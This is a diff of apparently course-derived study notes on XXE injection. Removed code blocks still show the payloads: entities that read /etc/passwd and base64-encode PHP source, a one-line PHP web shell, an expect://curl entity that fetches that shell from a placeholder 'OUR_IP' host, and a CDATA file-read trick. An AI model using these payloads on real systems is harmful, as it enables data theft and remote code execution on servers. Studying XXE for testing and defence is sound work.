@@ -793,11 +793,7 @@ to change the format we can try changing the `Content-Type` header to `applicati
 
 we can also use the `SYSTEM` keyword to define the external reference path: 
 
-```xml
-<!DOCTYPE email [
-  <!ENTITY company SYSTEM "file:///etc/passwd">
-]>
-```
+![](Images/Pasted%20image%2020240227173655.png)
 
 ![](Images/Pasted%20image%2020240227140834.png)
 
@@ -817,11 +813,7 @@ if a file contains some of XML's special characters `<`, `>`, `&` then it would 
 PHP provides wrapper filters that allow us to base64 encode certain resources like files  
 we can use `php://filter/` as a wrapper and specify the `convert.base64-encode` as our filter and then add an input resource `resource=index.php`: 
 
-```xml
-<!DOCTYPE email [
-  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
-]>
-```
+![](Images/Pasted%20image%2020240227173641.png)
 
 after sending this we can get the base64 encoded string of the index.php file: 
 
@@ -839,19 +831,11 @@ the most efficient method to turn XXE into RCE is by fetching a web shell from o
 
 we can start by writing a basic PHP web shell and starting a python web server: 
 
-```shell
-echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
-sudo python3 -m http.server 80
-```
+![](Images/Pasted%20image%2020240227173605.png)
 
 then inject the following XML to execute a curl command to download our web shell: 
 
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE email [
-  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
-]>
-```
+![](Images/Pasted%20image%2020240227173621.png)
 
 after sending the request we should receive a request on our machine for the shell.php file   
 however, keep in mind that the `expect` module is not enabled/installed by default on modern php servers 
@@ -879,14 +863,7 @@ this way the XML parser considers this part raw data which can contain any chara
 one easy way to do this is to define a `begin` internal entity with `<![CDATA[`, and `end` internal entity with `]]>`, and then place our external entity file in between  
 then this should be considered as a `CDATA` element: 
 
-```xml
-<!DOCTYPE email [
-  <!ENTITY begin "<![CDATA[">
-  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
-  <!ENTITY end "]]>">
-  <!ENTITY joined "&begin;&file;&end;">
-]>
-```
+![](Images/Pasted%20image%2020240227173732.png)
 
 then we can reference the `&joined;` entity that should contain our escaped data   
 but this will not work because XML prevents joining internal and external entities 
